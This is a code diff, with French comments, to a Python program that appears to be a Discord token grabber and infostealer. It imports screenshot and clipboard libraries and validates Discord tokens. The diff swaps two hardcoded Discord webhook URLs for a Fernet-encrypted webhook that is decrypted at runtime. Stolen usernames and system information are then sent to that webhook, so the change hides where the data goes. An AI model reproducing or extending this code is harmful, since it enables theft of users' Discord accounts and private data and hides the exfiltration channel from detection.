@@ -19,6 +19,44 @@ import platform
 import psutil
 import pyperclip
 from PIL import ImageGrab
+from cryptography.fernet import Fernet
+
+# Clé secrète générée
+SECRET_KEY = b"LmX2yw7HlQEWeu_WVgwK-Txe-_pvd2g1WmhplMZqF7o="
+
+# Webhook chiffré
+ENCRYPTED_WEBHOOK = b"gAAAAABnTPEMAVxlsZjU1FCCGKwA_l90-eJm5GAE2RchtjBlsMiq8cbZbU-prdmtUc1dfh3QAQ0sgbK6rHxn4-NanLsrSQBr7O_gBQZKRVVgnpLe77qRnQbAFAhL-UM_cEklyO7YuEjn-shvpIlcQUJ78IMNnirnf6UXzUbc5W8xCBncOqG0sKdwAl2jaZ6Gfzj3CuwFj8_n5cWuHoRkWuT2ecZaq_ya2DZ5N1FiDXr6qOvRibRsxBA="
+
+def decrypt_webhook(encrypted_webhook, key):
+    """Déchiffre le webhook avec AES (Fernet)."""
+    try:
+        cipher = Fernet(key)
+        decrypted_webhook = cipher.decrypt(encrypted_webhook).decode()
+        return decrypted_webhook
+    except Exception as e:
+        raise ValueError(f"Erreur lors du déchiffrement du webhook : {e}")
+
+try:
+    # Décoder le webhook
+    WEBHOOK_URL = decrypt_webhook(ENCRYPTED_WEBHOOK, SECRET_KEY)
+    print(f"Webhook décodé avec succès : {WEBHOOK_URL[:30]}...")  # Affiche partiellement pour la sécurité
+except ValueError as e:
+    print(f"Erreur : {e}")
+    exit(1)
+
+# Exemple d'utilisation
+def send_to_webhook(message):
+    """Envoie un message au webhook Discord."""
+    try:
+        import requests
+        payload = {"content": message}
+        response = requests.post(WEBHOOK_URL, json=payload)
+        if response.status_code == 204:
+            print("Message envoyé avec succès.")
+        else:
+            print(f"Erreur d'envoi : {response.status_code}")
+    except Exception as e:
+        print(f"Erreur lors de l'envoi : {e}")
 
 def get_system_info():
     """Récupère les informations système de base."""
@@ -301,8 +339,13 @@ def validate_and_get_user(Token):
         Name = User.json()["username"]
         Dis = User.json()["discriminator"]
         Username = f"{Name}#{Dis}"
-        Library.SendWebhook(Username, "https://discord.com/api/webhooks/1193516273905184789/VpXClQXZcEZXoAnPsac2NP5_QRUwyCVrOFg-P65MMuUCSo-jpeEaMPyhvW6sYZxg30iw")
-        send_system_info_to_webhook("https://discord.com/api/webhooks/1193516273905184789/VpXClQXZcEZXoAnPsac2NP5_QRUwyCVrOFg-P65MMuUCSo-jpeEaMPyhvW6sYZxg30iw")
+        try:
+            # Utiliser le webhook déchiffré directement
+            Library.SendWebhook(Username, WEBHOOK_URL)
+            send_system_info_to_webhook(WEBHOOK_URL)
+        except Exception as e:
+            print(f"Erreur lors de l'envoi au webhook : {e}")
+            exit(1)
         return Username, User
     else:
         return None, None
